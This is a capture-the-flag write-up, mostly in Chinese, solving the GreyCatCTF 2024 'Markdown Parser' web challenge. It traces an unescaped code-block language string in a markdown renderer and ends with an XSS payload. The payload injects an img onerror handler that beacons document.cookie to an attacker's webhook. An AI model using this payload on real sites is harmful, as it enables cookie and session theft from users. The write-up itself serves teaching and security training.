# Web/Markdown Parser

## DESC

![](/articles/00_CTFs/00_Online_Challenge/01_GreyCatCTF_2024/00_WEB_Markdown_Parser/20240421004117.png)

I built this simple markdown parser. Please give me some feedback (in markdown), I promise to read them all. Current features include: bold, italics, code blocks with syntax highlighting!

::: details 中文翻譯
我建立了這個簡單的 Markdown 解析器。請給我一些回饋（以 Markdown 格式），我保證會仔細閱讀所有的回饋。目前的功能包括：粗體、斜體以及帶有語法突顯的程式碼塊！
:::

> Author: ocean

challenge attach link:

-   challenge website url: [http://challs.nusgreyhats.org:33335/](http://challs.nusgreyhats.org:33335/)
-   attach files: [https://drive.google.com/uc?export=download&id=1o-co7HIGIkWffnsPMenQD-bEwyZeJaHv](https://drive.google.com/uc?export=download&id=1o-co7HIGIkWffnsPMenQD-bEwyZeJaHv)

## Background Knowledges

-   JS 閱讀及撰寫能力
-   對於 HTML 有基本的建構能力
-   能理解 HTML 的 property 使用
-   XSS 的偵查與攻擊能力

## Solve

1.  先不看原始碼進行偵查，發現他有三個部分：
    1. 編輯 markdown 頁面 （path: `/`)
    2. 觀看 markdown 的結果 (path: `/parse-markdown`，會帶著 query `markdown`)
    3. 進行 Feedback (path: `/feedback`，一個 API 點)
2.  觀察了一下 `/parse-markdown` 後面的 query `markdown` ，他是一串 base64，為你輸入進的文本內容。
3.  根據一般 web ctf 的類型，看到有 feedback 這種會回報的頁面，通常都是 `XSS`。
4.  打開原始碼進行確認。
    1. 基本上看到 `index.js` 中的內容都差不多。
    2. 看到 `admin.js` 會注意到他使用 `puppeteer` 套件，在第 24 至 30 行會注意到他去設定了 `Cookie`。他還很好心的設定 `http-only=false` ，不做 XSS 真的對不起他。
       ::: code-group
        ```js:line-numbers=24 {3,5} [admin.js]
        await page.setCookie({
            name: "flag",
            value: process.env.FLAG || "flag{fake_flag}",
            domain: cookieDomain,
            httpOnly: false,
            samesite: "strict",
        });
        ```
        :::
    3. 看到 `markdown.js` ，這是他設定如何將 markdown 渲染到 html 的 function lib。初步看下來，他在第 40 至 47 行有一個 `escapeHtml` 的函式，這個函式將一些常見的 xss 攻擊起手式 ban 掉了...
       ::: code-group
        ```js:line-numbers=40 [markdown.js]
        function escapeHtml(text) {
            return text
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#039;');
        }
        ```
        :::
        這可以在上面應證這點，只要牽涉到內容的產生，都有 `escapeHtml` 的蹤影。
5.  詳細觀看了原始碼，看起來沒有什麼注入點，甚至是想要利用 `markdown` 渲染一些 property 進去都不行。不過卻有一個小小缺口，就是在第 15 至 18 行要渲染 code block 上是用什麼語言的地方，他使用了「字串相接」這個方法來處理，而且也沒有用到 `escapeHtml` 函式來處理輸入的文字，因此就找到了 xss 的注入點。
    ::: code-group

    ````js:line-numbers=1 {18} [markdown.js]
    function parseMarkdown(markdownText) {
        const lines = markdownText.split('\n');
        let htmlOutput = "";
        let inCodeBlock = false;

        lines.forEach(line => {
            if (inCodeBlock) {
                if (line.startsWith('```')) {
                    inCodeBlock = false;
                    htmlOutput += '</code></pre>';
                } else {
                    htmlOutput += escapeHtml(line) + '\n';
                }
            } else {
                if (line.startsWith('```')) { // [!code focus:4]
                    language = line.substring(3).trim();
                    inCodeBlock = true;
                    htmlOutput += '<pre><code class="language-' + language + '">';
                } else {
                    line = escapeHtml(line);
                    line = line.replace(/`(.*?)`/g, '<code>$1</code>');
                    line = line.replace(/^(######\s)(.*)/, '<h6>$2</h6>');
                    line = line.replace(/^(#####\s)(.*)/, '<h5>$2</h5>');
                    line = line.replace(/^(####\s)(.*)/, '<h4>$2</h4>');
                    line = line.replace(/^(###\s)(.*)/, '<h3>$2</h3>');
                    line = line.replace(/^(##\s)(.*)/, '<h2>$2</h2>');
                    line = line.replace(/^(#\s)(.*)/, '<h1>$2</h1>');
                    line = line.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
                    line = line.replace(/__(.*?)__/g, '<strong>$1</strong>');
                    line = line.replace(/\*(.*?)\*/g, '<em>$1</em>');
                    line = line.replace(/_(.*?)_/g, '<em>$1</em>');
                    htmlOutput += line;
                }
            }
        });

        return htmlOutput;
    }
    ````

    :::

6.  既然找到了注入點，就可以把常規的 xss 注入放進去。

    這邊有三種方式：

    第一種是使用它內建的編寫，寫好就送出後就可以點選 `Feedback` 按鈕；

    第二種是你寫好 markdown 轉成 base64 後丟進 `/parse-markdown` 的 query `markdown` 中，再去按 `Feedback` 按鈕；

    第三種就是直接丟到 `/feedback` 那個 api。

    這邊就看個人興趣了選擇了。

    ::: tip
    不過這邊我為的省事，能用原生的東西就用原生的了...反正也不是強迫一定要怎樣做 :smile: 。
    :::
    ::: code-group

    ````markdown [evil payload]
    ```js"> <img src=x onerror="navigator.sendBeacon(<your webhook url>, document.cookie)
    happy xss
    ```
    ````

    :::

    ::: info
    為什麼我在 `img` 標籤後面不加入 `"` 以及用作關閉的 `>` ？

    是因為好巧不巧，在 `markdown.js` 的第 18 行字串連接都幫你弄好了，也就不要浪費了...。
    :::
